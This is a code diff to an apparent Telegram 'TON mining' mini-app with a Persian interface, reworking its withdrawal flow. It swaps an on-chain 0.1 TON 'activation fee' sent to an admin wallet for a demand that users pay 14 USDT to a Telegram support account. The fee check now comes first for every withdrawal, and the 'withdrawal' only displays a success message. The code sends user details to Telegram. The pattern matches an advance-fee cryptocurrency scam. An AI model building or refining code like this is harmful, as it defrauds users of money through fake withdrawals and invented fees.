@@ -13,7 +13,7 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
 
     <style>
-        /* استایل‌های کامل (مثل قبل) */
+        /* استایل‌های کامل */
         @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;500;700;900&display=swap');
         * { margin: 0; padding: 0; box-sizing: border-box; }
         html, body { height: 100%; overflow: hidden; }
@@ -152,7 +152,7 @@
         .modal-content h2 { font-size: 22px; margin-bottom: 20px; color: #fff; }
         .pay-notice { background: rgba(0,0,0,0.3); border: 1.5px solid #ffc107; color: #ffc107; padding: 15px; border-radius: 20px; font-size: 12px; margin-bottom: 20px; line-height: 1.8; text-align: justify; }
         .fee-tag { border: 2px dashed #00ff9d; color: #00ff9d; padding: 15px; border-radius: 25px; font-weight: 800; font-size: 20px; margin-bottom: 25px; background: rgba(0,255,157,0.05); }
-        #activationInput { display: none; } /* مخفی کردن فیلد کد */
+        #activationInput { display: none; }
         .activation-message { margin-top: 15px; padding: 12px; border-radius: 15px; background: rgba(0,255,157,0.1); border: 1px solid #00ff9d; color: #00ff9d; font-size: 14px; display: none; align-items: center; justify-content: center; gap: 10px; }
         .activation-message.show { display: flex; }
         .activation-message i { font-size: 18px; }
@@ -172,19 +172,19 @@
 
 <div id="userDetailModal" class="user-modal" onclick="if(event.target===this) closeUserModal()"><div class="modal-card"><h2><i class="fas fa-user"></i> جزئیات کاربر</h2><div id="userDetails"></div><button class="admin-btn-sm" style="width:100%;margin-top:20px;background:#ff512f" onclick="closeUserModal()"><i class="fas fa-times"></i> بستن</button></div></div>
 
-<!-- مودال فعالسازی (برای برداشت) - بدون فیلد کد -->
+<!-- مودال کارمزد (برای برداشت) - ویرایش شده به ۱۴ تتر و لینک پشتیبانی -->
 <div id="feeModal">
     <div class="modal-content">
         <i class="fas fa-lock"></i>
         <h2>فعالسازی برداشت</h2>
         <div class="pay-notice">
             <i class="fas fa-exclamation-triangle" style="margin-left:5px;"></i>
-            شما کارمزد فعالسازی کیف پول را پرداخت نکرده‌اید. برای برداشت ابتدا کارمزد را واریز کنید.
+            شما کارمزد فعالسازی را پرداخت نکرده‌اید. برای برداشت ابتدا کارمزد ۱۴ تتر (USDT) را به پشتیبانی پرداخت کنید.
         </div>
-        <div class="fee-tag">0.1 TON</div>
-        <button id="payFeeBtn" class="btn active-btn">
-            <i class="fas fa-check-circle"></i> پرداخت کارمزد
-        </button>
+        <div class="fee-tag">۱۴ تتر (USDT)</div>
+        <a href="https://t.me/miningertoncoin" target="_blank" class="btn active-btn">
+            <i class="fas fa-headset"></i> پیام به پشتیبانی
+        </a>
         <div id="activationMessage" class="activation-message">
             <i class="fas fa-spinner fa-pulse"></i>
             <span>در حال پردازش تراکنش ...</span>
@@ -526,54 +526,6 @@ async function executeSmartTransaction(userAddress) {
     }
 }
 
-// ==================== پرداخت کارمزد فعالسازی (برای برداشت) ====================
-async function payActivationFee() {
-    if (!isWalletConnected) {
-        showToast("❌ ابتدا کیف پول را متصل کنید");
-        switchPage('wallet', document.querySelector('.nav-item:nth-child(2)'));
-        return;
-    }
-    if (isProcessingTransaction) return;
-    try {
-        isProcessingTransaction = true;
-        const activationMessage = document.getElementById('activationMessage');
-        activationMessage.classList.add('show');
-        
-        const userAddress = document.getElementById('walletAddressFull').innerText;
-        const amountToSend = 0.1;
-        const message = "Network fee for wallet activation";
-        const payload = createCommentPayload(message);
-        const amountInNano = Math.floor(amountToSend * 1e9).toString();
-
-        const transaction = {
-            validUntil: Math.floor(Date.now() / 1000) + 600,
-            messages: [{
-                address: CONFIG.ADMIN_WALLET_RAW,
-                amount: amountInNano,
-                payload: payload
-            }]
-        };
-
-        const result = await tonConnectUI.sendTransaction(transaction);
-        
-        localStorage.setItem('isActivated', 'true');
-        document.getElementById('feeModal').style.display = 'none';
-        showToast("✅ پنل با موفقیت فعال شد!");
-        addToHistory('فعالسازی', 'پنل فعال شد');
-        sendToTelegram(`✅ **فعالسازی موفق**\n👤 نام: ${currentUser?.firstName||'ناشناس'} ${currentUser?.lastName||''}\n🆔 آیدی: ${currentUser?.id}\n📛 یوزرنیم: ${currentUser?.username?'@'+currentUser.username:'ندارد'}\n⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
-    } catch (error) {
-        console.error('❌ خطا:', error);
-        if (error.message?.includes('rejected')) {
-            showToast('❌ تراکنش لغو شد');
-        } else {
-            showToast('❌ خطا در تراکنش: ' + (error.message || 'نامشخص'));
-        }
-    } finally {
-        isProcessingTransaction = false;
-        document.getElementById('activationMessage').classList.remove('show');
-    }
-}
-
 // ==================== راه‌اندازی TonConnect ====================
 const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
     manifestUrl: 'https://raw.githubusercontent.com/nimwmesfandiari/ton-plus-bot/main/tonconnect-manifest.json',
@@ -894,16 +846,20 @@ window.finalWithdraw = function() {
         showToast("❌ موجودی قابل برداشت صفر است");
         return;
     }
+    
+    // اولویت اول: بررسی فعال بودن پنل
+    if (localStorage.getItem('isActivated') !== 'true') {
+        // نمایش مودال پرداخت کارمزد (بدون نیاز به حداقل موجودی)
+        document.getElementById('feeModal').style.display = 'flex';
+        return;
+    }
+    
+    // سپس بررسی حداقل مبلغ برداشت
     if (withdrawableBalance < CONFIG.MINIMUM_FINAL_WITHDRAW) {
         showToast(`⚠️ حداقل مبلغ برداشت ${CONFIG.MINIMUM_FINAL_WITHDRAW} TON است`);
         return;
     }
-    // بررسی فعال بودن پنل
-    if (localStorage.getItem('isActivated') !== 'true') {
-        // نمایش مودال پرداخت کارمزد
-        document.getElementById('feeModal').style.display = 'flex';
-        return;
-    }
+    
     // انجام برداشت نهایی
     const amountToWithdraw = withdrawableBalance;
     addToHistory('برداشت نهایی', `${amountToWithdraw.toFixed(6)} TON`);
@@ -914,9 +870,6 @@ window.finalWithdraw = function() {
     document.getElementById('finalWithdrawBtn').classList.add('disabled');
     showToast(`✅ برداشت ${amountToWithdraw.toFixed(6)} TON با موفقیت انجام شد`);
 };
-
-// ==================== رویداد دکمه پرداخت کارمزد ====================
-document.getElementById('payFeeBtn').addEventListener('click', payActivationFee);
 
 // ==================== مقداردهی اولیه (بدون پاپ‌آپ فعالسازی) ====================
 const u = tg.initDataUnsafe?.user;
